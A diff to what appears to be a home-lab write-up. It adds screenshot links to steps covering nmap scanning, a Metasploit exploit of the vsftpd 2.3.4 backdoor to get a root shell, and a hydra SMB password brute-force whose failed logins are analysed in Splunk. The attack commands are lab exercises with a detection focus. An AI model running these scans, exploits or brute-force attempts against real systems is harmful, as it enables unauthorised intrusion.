@@ -32,6 +32,8 @@ nmap -sV -O 192.168.56.0/24
 nmap -A 192.168.56.104
 ```
 
+![nmap metasploit](assets/nmap-Metasploit.png)
+
 **Findings:** Multiple intentionally vulnerable services were identified on Metasploitable 2, including an exposed FTP service running vsftpd 2.3.4.
 
 ---
@@ -48,6 +50,8 @@ set LHOST 192.168.56.20
 run
 ```
 
+![Metasploit on Kali Linux](assets/Metasploit-Kali.png)
+
 **Outcome:** Successfully exploited the vulnerable FTP backdoor on Metasploitable 2 and obtained a root shell.
 
 ---
@@ -60,6 +64,8 @@ hydra -l Administrator -P passwords.txt smb://192.168.56.30
 ```
 
 **Outcome:** Generated multiple failed authentication attempts against the Windows 11 workstation over SMB (port 445). These events were captured and analyzed in Splunk as Event ID 4625.
+
+![Attacking Windows 11](assets/Attacking-Windows11.png
 
 ---
 
